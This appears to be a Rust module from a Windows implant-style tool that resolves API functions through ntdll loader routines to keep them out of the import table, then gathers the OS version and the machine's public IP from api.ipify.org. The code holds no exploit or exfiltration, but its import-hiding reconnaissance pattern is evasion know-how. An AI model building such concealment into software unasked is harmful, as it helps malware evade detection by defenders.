extern crate windows_sys as windows;
use windows::Win32::System::SystemInformation::OSVERSIONINFOW;

use winapi::{ctypes::c_void as winapi_void, shared::{minwindef::{BOOL, FARPROC, HMODULE}, ntdef::{BOOLEAN, HANDLE, STRING, UNICODE_STRING}}};

use windows::Win32::Networking::WinInet::{
    INTERNET_FLAG_RELOAD, INTERNET_OPEN_TYPE_DIRECT, INTERNET_SERVICE_HTTP,
};

use std::{ffi::{c_void, CString, OsStr}, mem, os::windows::ffi::OsStrExt, ptr::null_mut};
//use std::os::windows::ffi::OsStringExt;

// Define RtlGetVersion function type
type RtlGetVersion = unsafe extern "system" fn(*mut OSVERSIONINFOW) -> i32;

// This function retrieves a handle to a DLL module.
// The function takes a DLL name as a string and returns a handle to the DLL module.

fn ldr_get_dll(dll_name: &str, ntdll: usize, kernel32: usize) -> HMODULE {

    let load_library_a = match dinvoke_rs::dinvoke::get_function_address(kernel32, "LoadLibraryA") {
        0 => {
            println!("Failed to get LoadLibraryA address");
            return null_mut();
        },
        addr => addr,
    };

    let rtl_init_unicode_string = match dinvoke_rs::dinvoke::get_function_address(ntdll, "RtlInitUnicodeString") {
        0 => {
            println!("Failed to get RtlInitUnicodeString address");
            return null_mut();
        },
        addr => addr,
    };

    let ldr_get_dll_handle = match dinvoke_rs::dinvoke::get_function_address(ntdll, "LdrGetDllHandle") {
        0 => {
            println!("Failed to get LdrGetDllHandle address");
            return null_mut();
        },
        addr => addr,
    };

    let mut handle: *mut winapi_void = null_mut();
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: null_mut(),
    };

    let dll_name_wide: Vec<u16> = OsStr::new(dll_name).encode_wide().chain(Some(0)).collect();
    
    unsafe {
        // First, try to load the DLL if it's not already loaded
        let load_library_a: extern "system" fn(*const i8) -> HMODULE = std::mem::transmute(load_library_a);
        let dll_name_cstr = CString::new(dll_name).unwrap();
        let loaded_handle = load_library_a(dll_name_cstr.as_ptr());
        
        if loaded_handle.is_null() {
            println!("LoadLibraryA failed to load {}", dll_name);
            return null_mut();
        }

        // Now proceed with getting a handle using LdrGetDllHandle
        let rtl_init_unicode_string: extern "system" fn(*mut UNICODE_STRING, *const u16) = 
            std::mem::transmute(rtl_init_unicode_string);
        rtl_init_unicode_string(&mut unicode_string, dll_name_wide.as_ptr());

        let ldr_get_dll_handle: extern "system" fn(
            *mut winapi_void,
            *mut winapi_void,
            *mut UNICODE_STRING,
            *mut *mut winapi_void
        ) -> i32 = std::mem::transmute(ldr_get_dll_handle);

        let status = ldr_get_dll_handle(
            null_mut(),
            null_mut(),
            &mut unicode_string,
            &mut handle,
        );

        if status != 0 {
            println!("LdrGetDllHandle failed with status: {} for {}", status, dll_name);
            return null_mut();
        }
        if handle.is_null() {
            println!("LdrGetDllHandle returned null handle for {}", dll_name);
            return null_mut();
        }
    }

    handle as HMODULE
}

// This function retrieves the address of an exported function from a DLL module.
// The function takes a handle to a DLL module and a function name as a string, and returns a pointer to the function.
fn ldr_get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let ntdll = dinvoke_rs::dinvoke::get_module_base_address("ntdll.dll");
    let rtl_init_unicode_string = dinvoke_rs::dinvoke::get_function_address(ntdll, "RtlInitUnicodeString");
    let rtl_unicode_string_to_ansi_string = dinvoke_rs::dinvoke::get_function_address(ntdll, "RtlUnicodeStringToAnsiString");
    let ldr_get_procedure_address = dinvoke_rs::dinvoke::get_function_address(ntdll, "LdrGetProcedureAddress");

    // Initialize a null pointer to a function.
    let mut func: *mut winapi_void = std::ptr::null_mut();
    // Initialize a STRING structure to hold the function name.
    let mut ansi_string = STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Initialize a UNICODE_STRING structure to hold the function name.
    let mut unicode_string = UNICODE_STRING {
        Length: 0,
        MaximumLength: 0,
        Buffer: std::ptr::null_mut(),
    };
    // Convert the function name to a wide string.
    let fn_name_wide: Vec<u16> = OsStr::new(fn_name).encode_wide().chain(Some(0)).collect();
    
    unsafe {
        // Initialize the UNICODE_STRING structure with the function name.
        let rtl_init_unicode_string: extern "system" fn(*mut UNICODE_STRING, *const u16) = 
            std::mem::transmute(rtl_init_unicode_string);
        rtl_init_unicode_string(&mut unicode_string, fn_name_wide.as_ptr());

        // Convert the UNICODE_STRING to an ANSI string.
        let rtl_unicode_string_to_ansi_string: extern "system" fn(*mut STRING, *const UNICODE_STRING, BOOLEAN) -> i32 = 
            std::mem::transmute(rtl_unicode_string_to_ansi_string);
        let status = rtl_unicode_string_to_ansi_string(&mut ansi_string, &unicode_string, 1);
        
        if status != 0 {
            return std::ptr::null_mut();
        }

        // Call the LdrGetProcedureAddress function to get the address of the function.
        let ldr_get_procedure_address: extern "system" fn(
            HMODULE,
            *mut STRING,
            u32,
            *mut *mut winapi_void
        ) -> i32 = std::mem::transmute(ldr_get_procedure_address);

        let status = ldr_get_procedure_address(
            dll,
            &mut ansi_string,
            0,
            &mut func,
        );

        // If the function call was not successful or the function pointer is null, return a null pointer.
        if status != 0 || func.is_null() {
            println!("call failed");
            return std::ptr::null_mut();
        }
    }
    // Return the pointer to the function.
    func as FARPROC
} //ldr_get_fn

pub fn get_version(ntdll: usize) -> String {
    unsafe {
        let function_ptr = dinvoke_rs::dinvoke::get_function_address(ntdll, "RtlGetVersion");
        let function_type: RtlGetVersion = std::mem::transmute(function_ptr as usize);
        let ret: i32;

        let mut version_info = OSVERSIONINFOW {
            dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as u32,
            dwMajorVersion: 0,
            dwMinorVersion: 0,
            dwBuildNumber: 0,
            dwPlatformId: 0,
            szCSDVersion: [0; 128],
        };

        ret = function_type(&mut version_info);

        match ret {
            0 => {
                format!("Windows {}.{}.{}", 
                    version_info.dwMajorVersion, 
                    version_info.dwMinorVersion, 
                    version_info.dwBuildNumber)
            },
            status => format!("Error: NTSTATUS == {:X}", status as u32),
        }
    }
}

//this function makes a get request to api.ipify.org to get our external ip
//it is not using https.

pub fn get_external_ip(ntdll: usize, kernel32: usize) -> String {
    /*
    This function, `get_external_ip`, is used to retrieve the external IP address of the current machine.
    It does this by making an HTTP GET request to the "api.ipify.org" server, which returns the public IP address of the
    client making the request.
    The function starts by defining some constants such as the user agent, server name, endpoint, and HTTP method.
    Next, it dynamically loads several functions from the "wininet.dll" library using the `ldr_get_dll` and `ldr_get_fn` functions.
    These functions include `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, and
    `InternetCloseHandle`.
    The function then transmutes these function pointers into the appropriate function types using `mem::transmute`.
    The `InternetOpenA` function is used to initialize an application's use of the WinINet functions. The `InternetConnectA`
    function is used to make a connection to the server. The `HttpOpenRequestA` function is used to create an HTTP request handle.
    The `HttpSendRequestA` function is used to send the HTTP request.
    If the request is successful, the function reads the response using the `InternetReadFile` function. The response is the
    public IP address of the client, which is stored in the `ip` string.
    Finally, the function closes the handles using the `InternetCloseHandle` function and returns the IP address.
    Note: This function uses unsafe Rust due to the direct use of Windows API and dynamic function loading.
    */
    let user_agent = CString::new("Mozilla/5.0").unwrap();
    let server_name = CString::new("api.ipify.org").unwrap();
    let endpoint = CString::new("").unwrap();
    let method = CString::new("GET").unwrap();

    //dynamic load of InternetOpenA, InternetConnectA, HttpOpenRequestA, HttpSendRequestA, InternetReadFile, InternetCloseHandle
    //using ldr_get_dll and ldr_get_fn

    //let module_name = ldr_get_dll("wininet.dll");
    let module_name = ldr_get_dll("wininet.dll", ntdll, kernel32); //for testing
    if module_name.is_null() {
        return String::from("Failed to load wininet.dll");
    }
    //println!("wininet.dll loaded");
    let h_internet = ldr_get_fn(module_name, "InternetOpenA");
    if h_internet.is_null() {
        return String::from("Failed to load InternetOpenA");
    }
    //println!("InternetOpenA loaded");
    let h_connect = ldr_get_fn(module_name, "InternetConnectA");
    let h_request = ldr_get_fn(module_name, "HttpOpenRequestA");
    let h_send = ldr_get_fn(module_name, "HttpSendRequestA");

    let h_internet: unsafe extern "system" fn(*const i8, i32, *const i8, *const i8, u32) -> HANDLE =
        unsafe { mem::transmute(h_internet) };
    let h_connect: unsafe extern "system" fn(
        HANDLE,
        *const i8,
        u16,
        *const i8,
        *const i8,
        i32,
        u32,
        u32,
    ) -> HANDLE = unsafe { mem::transmute(h_connect) };
    let h_request: unsafe extern "system" fn(
        HANDLE,
        *const i8,
        *const i8,
        *const i8,
        *const i8,
        *const i8,
        u32,
        u32,
    ) -> HANDLE = unsafe { mem::transmute(h_request) };
    let h_send: unsafe extern "system" fn(HANDLE, *const i8, i32, *mut c_void, u32) -> BOOL =
        unsafe { mem::transmute(h_send) };

    let h_internet = unsafe {
        h_internet(
            user_agent.as_ptr() as *const i8,
            (INTERNET_OPEN_TYPE_DIRECT as i32).try_into().unwrap(),
            null_mut(),
            null_mut(),
            0,
        )
    };

    let h_connect = unsafe {
        h_connect(
            h_internet,
            server_name.as_ptr() as *const i8,
            80, //443 for https, 80 for http
            null_mut(),
            null_mut(),
            (INTERNET_SERVICE_HTTP as i32).try_into().unwrap(),
            0,
            0,
        )
    };

    let h_request = unsafe {
        h_request(
            h_connect,
            method.as_ptr() as *const i8,
            endpoint.as_ptr() as *const i8,
            null_mut(),
            null_mut(),
            null_mut(),
            INTERNET_FLAG_RELOAD,
            0,
        )
    };

    let res = unsafe { h_send(h_request, null_mut() as *const i8, 0, null_mut(), 0) };

    let mut buffer = [0; 1024];
    let mut bytes_read = 0;
    let mut ip = String::new();

    if res == 0 {
        //println!("Request failed.");
    } else {
        //dynamic load of InternetReadFile using ldr_get_dll and ldr_get_fn
        let module_name = ldr_get_dll("wininet.dll", ntdll, kernel32);
        let h_read = ldr_get_fn(module_name, "InternetReadFile");
        let h_read: unsafe extern "system" fn(HANDLE, *mut c_void, u32, *mut u32) -> BOOL =
            unsafe { mem::transmute(h_read) };

        unsafe {
            while h_read(
                h_request,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                &mut bytes_read,
            ) != 0
                && bytes_read != 0
            {
                ip.push_str(&String::from_utf8_lossy(&buffer[..bytes_read as usize]));
            }
        }
    }

    //dynamic load of InternetCloseHandle using ldr_get_dll and ldr_get_fn
    //let module_name = ldr_get_dll("wininet.dll");
    let h_close = ldr_get_fn(module_name, "InternetCloseHandle");
    let h_close: unsafe extern "system" fn(HANDLE) -> BOOL = unsafe { mem::transmute(h_close) };

    unsafe { h_close(h_request) };
    unsafe { h_close(h_connect) };
    unsafe { h_close(h_internet) };

    ip
} //http version